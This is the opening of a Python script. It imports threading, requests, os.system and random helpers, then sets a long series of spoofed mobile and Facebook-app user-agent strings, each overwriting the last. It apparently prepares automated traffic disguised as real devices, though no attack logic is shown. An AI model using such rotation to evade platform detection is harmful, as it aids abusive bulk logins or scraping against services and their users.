from concurrent.futures import ThreadPoolExecutor as tred
import requests,sys
from os import system as cmd
from random import randint as rr
from random import choice as rc
from string import digits as digits
#------------------[ USER-AGENT ]-------------------#

ua = ["Mozilla/5.0 (Linux; Android 11; M2003J15SC Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 10; MI 8 Pro Build/QKQ1.190828.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 GNews Android/2022118446",]
ua = ["TwitterAndroid/9.80.0-release.0 (29800000-r-0) SM-N975F/7.1.2 (samsung;SM-N975F;samsung;SM-N975F;0;;1;2016)",]
ua = ["Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Pro Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (Linux; Android 13; CPH2145 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 273.0.0.16.70 (iPhone12,1; iOS 16_3_1; tr_TR; tr-TR; scale=2.00; 828x1792; 452417278",]
ua = ["Mozilla/5.0 (Linux; Android 10; Redmi Note 8 Build/QKQ1.200114.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 10; EML-L29 Build/HUAWEIEML-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.1.0.28.72",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-A536B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/99.0.4844.88 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/402.1.0.24.84",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-S901U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.1.0.28.72",]
ua = ["Mozilla/5.0 (Android 10; Mobile; rv:109.0) Gecko/111.0 Firefox/111.0 [ip:87.12.52.138",]
ua = ["TuneIn Radio/25.1.0; iPhone14,3; iOS/15.0.2",]
ua = ["Mozilla/5.0 (Linux; Android 12; Nokia 5.4 Build/SKQ1.220119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (Linux; Android 11; SM-A127F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.1.0.28.72",]
ua = ["Mozilla/5.0 (Linux; Android 8.1.0; LGL423DL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-A127F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.118 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 11; SM-T725 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Safari/537.36 [FB_IAB/FB4A;FBAV/325.0.0.36.170",]
ua = ["AppleCoreMedia/1.0.0.21G115 (Macintosh; U; Intel Mac OS X 15_7; hr_hr)",]
ua = ["Mozilla/5.0 (Linux; Android 12; RMX3085 Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (Linux; Android 11; SM-A307FN Build/RP1A.200720.012) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (Linux; Android 9; LM-X320 Build/PKQ1.190414.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 9; AFTLBT962E2 Build/PS7290.2744N; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.160 Mobile Safari/537.36 cordova-amazon-fireos/3.4.0 AmazonWebAppPlatform/3.4.0;2.0",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-A405FN Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.138 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 13; CPH2333 Build/TP1A.220905.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-A528B Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (Linux; Android 4.4.4; SM-T560) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36 [ip:87.17.151.73",]
ua = ["Mozilla/5.0 (Linux; Android 11; M2103K19G Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 11; Mi Note 10 Lite Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.1.0.28.72",]
ua = ["Mozilla/5.0 (Linux; Android 10; 1AZ2P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; SM-A105FN Build/RP1A.200720.012) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (Linux; Android 11; SM-A202F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Mobile Safari/537.36 [ip:37.159.75.249]",]
ua = ["Mozilla/5.0 (Linux; Android 12; 2201116TG Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 GNews Android/2022108570",]
ua = ["Mozilla/5.0 (Linux; Android 11; M2002J9G Build/RKQ1.200826.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (Linux; Android 11; E940-2795-00) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.192 Mobile Safari/537.36 OPR/74.0.3922.70977",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-A750FN Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.138 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/392.2.0.33.108",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-M336B Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (Linux; Android 13; Pixel 6 Build/TQ1A.230205.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 10; LM-K510 Build/QKQ1.200730.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 GNews Android/2022118446",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-A415F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-M135M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20D67 [FBAN/FBIOS;FBAV/405.1.0.32.71;FBBV/454815867;FBDV/iPhone12,5;FBMD/iPhone;FBSN/iOS;FBSV/16.3.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/456969795",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-A025AZ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36",]
ua = ["radio.net 5.6.19 (iPhone; iPhone OS 16.3.1; ru_MD)",]
ua = ["Mozilla/5.0 (Linux; Android 9; ANE-LX3 Build/HUAWEIANE-L03; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 UCURSOS/v1.6_282-android",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-A217M Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 9; LLD-L31 Build/HONORLLD-L31; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.122 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81",]
ua = ["Mozilla/5.0 (Linux; Android 9; SM-G950F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.86 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81",]
ua = ["Mozilla/5.0 (Linux; Android 7.0; BTV-DL09 Build/HUAWEIBEETHOVEN-DL09) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (iPad; CPU OS 12_5_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 (5836432512)",]
ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 [ip:93.148.109.124",]
ua = ["Mozilla/5.0 (Linux; Android 7.0; SM-J730G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-N960F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.75 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 12; M2007J20CG Build/SKQ1.211019.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 GNews Android/2022116172",]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 15_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 (4372599744)",]
ua = ["AppleCoreMedia/1.0.0.20D67 (iPad; U; CPU OS 16_3_1 like Mac OS X; hu_hu)",]
ua = ["Mozilla/5.0 (Linux; Android 11; TFY-LX1 Build/HONORTFY-L31CQ; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 11; SM-A207F Build/RP1A.200720.012) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (Linux; Android 12; motorola edge 30 neo Build/S3SSMS32.34-46-1-4; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/346.0.0.8.76",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-A528B Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-M336B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 9; ANE-LX1 Build/HUAWEIANE-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.118 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-S901B Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (Linux; Android 10; HTC Desire 20 Pro Build/QQ1A.200205.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (Linux; Android 12; moto g pro Build/S0PRS32.44-11-10-22; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.61 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/395.0.0.27.214",]
ua = ["Mozilla/5.0 (Linux; Android 13; 2109119DG Build/TKQ1.220829.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 11; Mi 9T Build/RKQ1.200826.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (Linux; Android 12; M2003J15SC Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.1.0.28.72",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-A315G Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (Linux; Android 13; 2109119DG Build/TKQ1.220829.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 274.0.0.16.90 (iPhone14,3; iOS 16_3_1; tr_TR; tr-TR; scale=3.00; 1284x2778; 455531335) NW/3",]
ua = ["Mozilla/5.0 (Linux; Android 9; moto e6s Build/POBS29.288-60-6-1-29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["TuneIn Radio/25.1.0; iPhone13,2; iOS/16.3",]
ua = ["Mozilla/5.0 (Linux; Android 11; SM-A805F Build/RP1A.200720.012) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 GNews Android/2022116172",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-G970F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-A127F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; 9.1; YT9218D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; 220333QNY Build/RKQ1.211001.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (Linux; Android 11; ONEPLUS A6013 Build/RKQ1.201217.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.85 Mobile Safari/537.36 GNews Android/2022118446",]
ua = ["TuneIn Radio/24.6.2; iPad11,7; iPadOS/16.3.1",]
ua = ["Mozilla/5.0 (Linux; Android 11; RMX3623 Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 11; RMX3269 Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.75 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 12; Redmi Note 7 Build/SQ3A.220705.004; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["TuneIn Radio Pro/25.1.0; iPad13,18; iPadOS/16.3.1",]
ua = ["Mozilla/5.0 (Linux; Android 10; S59 Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Pro Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 274.0.0.16.90 (iPhone11,8; iOS 16_0_3; tr_TR; tr-TR; scale=2.00; 828x1792; 455531335)",]
ua = ["Mozilla/5.0 (Linux; Android 11; CPH2271 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.0.0.23.72",]
ua = ["Mozilla/5.0 (Linux; Android 13; RMX3241 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 11; 2201117TY Build/RKQ1.211001.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0 [ip:151.76.119.47",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-M127F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A217F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/20.0 Chrome/106.0.5249.126 Mobile Safari/537.36 [ip:79.56.51.1",]
ua = ["Mozilla/5.0 (Linux; Android 11; SM-A207F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.79 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/375.1.0.28.111",]
ua = ["Mozilla/5.0 (Linux; Android 11; SM-A307FN Build/RP1A.200720.012) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (Linux; Android 8.0.0; SM-A530F Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.90 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/373.0.0.31.112",]
ua = ["Mozilla/5.0 (Linux; Android 12; ASUS_I002D Build/SKQ1.210821.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 13; 2109119DG Build/TKQ1.220829.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-G991B Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (Linux; Android 8.1.0; SM-J260M Build/M1AJB; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 9; Redmi 6A Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.118 Mobile Safari/537.36 GNews Android/2022116172",]
ua = ["Mozilla/5.0 (Linux; Android 7.0; HUAWEI VNS-L31 Build/HUAWEIVNS-L31; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 14_8_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 LightSpeed [FBAN/MessengerLiteForiOS;FBAV/400.1.0.29.86;FBBV/456486911;FBDV/iPhone11,8;FBMD/iPhone;FBSN/iOS;FBSV/14.8.1;FBSS/2;FBCR/;FBID/phone;FBLC/en-GB;FBOP/0",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-T860 Build/SP2A.220305.013; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 13; CPH2399 Build/TP1A.220905.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 GNews Android/2022118446",]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 274.0.0.16.90 (iPhone14,2; iOS 16_2; tr_TR; tr-TR; scale=3.00; 1170x2532; 455531335)",]
ua = ["Mozilla/5.0 (Linux; Android 10; CPH2089 Build/QKQ1.200216.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-N960F Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (Linux; Android 8.0.0; WAS-LX1A Build/HUAWEIWAS-LX1A) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-A715F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 7.1.1; ASUS_Z01KS Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.1.0.28.72",]
ua = ["Mozilla/5.0 (Linux; Android 10; S88Plus Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 GNews Android/2022118446",]
ua = ["Mozilla/5.0 (Linux; Android 12; 2201116PG Build/SKQ1.211006.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (Linux; Android 12; V2023 Build/SP1A.210812.003) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (Linux; Android 13; 22071212AG Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.41 Config/90.2.8151.52",]
ua = ["Mozilla/5.0 (Linux; arm_64; Android 12; SM-M215F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 YaBrowser/23.1.7.38.00 SA/3 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; motorola one action Build/RSBS31.Q1-48-36-26; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/402.1.0.24.84",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-A405FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36 [ip:37.160.146.27",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-S901B Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 GNews Android/2022118446",]
ua = ["Mozilla/5.0 (Linux; Android 13; CPH2195 Build/TP1A.220905.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-N986B Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (iPad; CPU OS 12_5_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 (4662026496)",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 7.1.2; 2201122C Build/N2G47H)",]
ua = ["Mozilla/5.0 (Linux; Android 9; SM-A530F Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (Linux; 4.4.2; SUPRA M748G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",]
ua = ["Opera/9.80 (Linux mips; ) Presto/2.12.407 Version/12.51 MB97/0.0.34.18 (DIGIHOME, Mxl661LG32, wireless) VSTVB_MB97 SmartTvA/3.0.0",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-A415F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 GNews Android/2022120648",]
